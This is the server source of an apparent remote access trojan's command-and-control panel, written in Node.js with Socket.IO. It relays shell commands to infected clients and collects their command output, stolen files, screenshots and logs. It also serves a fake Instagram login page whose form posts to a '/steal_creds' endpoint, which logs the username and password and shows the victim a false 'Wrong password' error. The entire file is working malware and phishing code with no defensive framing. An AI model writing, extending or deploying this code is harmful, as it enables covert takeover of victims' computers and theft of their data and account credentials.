const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" } });

app.use(express.static('public'));
app.use(express.json());

const clients = new Map();

io.on('connection', (socket) => {
    console.log(`Connected: ${socket.id}`);

    socket.on('register', (info) => {
        clients.set(socket.id, { id: socket.id, info, lastSeen: Date.now() });
        io.emit('clients_update', Array.from(clients.values()));
    });

    // Standard command execution (shell)
    socket.on('cmd', (data) => {
        if (data && data.clientId) {
            io.to(data.clientId).emit('cmd', data.cmd);
        }
    });

    // Output from client back to admin
    socket.on('cmd_output', (data) => {
        io.to(data.adminId).emit('command_result', {
            clientId: socket.id,
            output: data.output
        });
    });

    // File data
    socket.on('file_data', (data) => {
        io.to(data.adminId).emit('file_received', {
            clientId: socket.id,
            name: data.name,
            content: data.content
        });
    });

    // Screenshot data
    socket.on('screenshot_data', (data) => {
        io.to(data.adminId).emit('screenshot_received', {
            clientId: socket.id,
            image: data.image
        });
    });

    // Logs data
    socket.on('logs_data', (data) => {
        io.to(data.adminId).emit('logs_result', {
            clientId: socket.id,
            type: data.type,
            content: data.content
        });
    });

    // 🔁 UNIVERSAL RELAY: Forward any other event to the target client
    socket.onAny((event, data) => {
        // Skip internal events and those already handled
        if (['cmd', 'cmd_output', 'file_data', 'screenshot_data', 'logs_data', 'register', 'disconnect'].includes(event))
            return;
        if (data && data.clientId) {
            const { clientId, adminId, ...forwardData } = data;
            io.to(clientId).emit(event, forwardData);
            console.log(`Relayed "${event}" to ${clientId}`);
        }
    });

    socket.on('disconnect', () => {
        clients.delete(socket.id);
        io.emit('clients_update', Array.from(clients.values()));
    });
});

// Instagram phishing endpoint
app.post('/steal_creds', (req, res) => {
    console.log('Stolen credentials:', req.body);
    res.send('OK');
});

app.get('/ig-phish', (req, res) => {
    res.send(`
        <html><body style="background:black;color:white;text-align:center;">
        <h2>Instagram</h2>
        <form id="login" action="/steal_creds" method="post">
            <input name="username" placeholder="Username"><br><br>
            <input name="password" type="password" placeholder="Password"><br><br>
            <button type="submit">Log in</button>
        </form>
        <script>
            document.getElementById('login').onsubmit = function(e) {
                e.preventDefault();
                fetch('/steal_creds', {method:'POST', body: new FormData(this)});
                alert('Wrong password. Try again.');
            }
        </script>
        </body></html>
    `);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
